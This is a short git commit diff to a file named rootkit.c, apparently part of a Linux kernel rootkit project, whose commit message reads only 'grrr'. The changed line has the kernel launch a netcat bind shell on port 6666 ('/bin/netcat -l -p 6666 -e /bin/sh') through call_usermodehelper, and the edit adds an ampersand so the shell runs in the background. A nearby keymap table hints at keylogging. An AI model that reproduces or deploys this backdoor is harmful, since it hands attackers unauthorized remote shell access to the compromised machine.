129b9c5156706c1b2d538f848c0d64b933df2dee
Michael Fröwis <mfrowis@localhost.localdomain>
2016-01-07 09:22:06 +0100

    grrr

--- rootkit.c
+++ rootkit.c
@@ -136,7 +136,7 @@ static const char* keymap_shift[] =
 
 	    //char *argv1[] = {"/bin/sh", "-c", "/bin/echo > /home/michael/here.txt", NULL}; 
 
-	    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
+	    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; 
 
 	    //call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT); // Remove all netcat version
 	    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
